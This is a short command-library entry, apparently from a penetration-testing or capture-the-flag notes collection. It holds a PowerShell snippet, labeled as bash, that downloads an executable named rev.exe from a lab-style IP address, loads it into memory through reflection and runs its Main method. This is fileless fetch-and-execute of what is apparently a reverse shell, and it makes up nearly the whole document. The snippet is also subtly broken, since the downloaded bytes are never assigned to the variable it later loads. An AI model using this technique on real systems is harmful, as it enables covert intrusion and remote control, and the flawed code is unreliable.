---
id: fbf43c10-1a5a-4993-9958-c7c95d7147fc
name: Download and run assembly without arguments
type: command
executor: bash
data: '(New-Object System.Net.WebClient).DownloadData(''http://10.10.16.7/rev.exe'')

  $assem = [System.Reflection.Assembly]::Load($data)

  [rev.Program]::Main()'
output: null
created_at: '2023-04-06T03:56:24.082002+00:00'
updated_at: '2023-04-10T20:37:02.186238+00:00'
---

# Download and run assembly without arguments

```bash
(New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main()
```
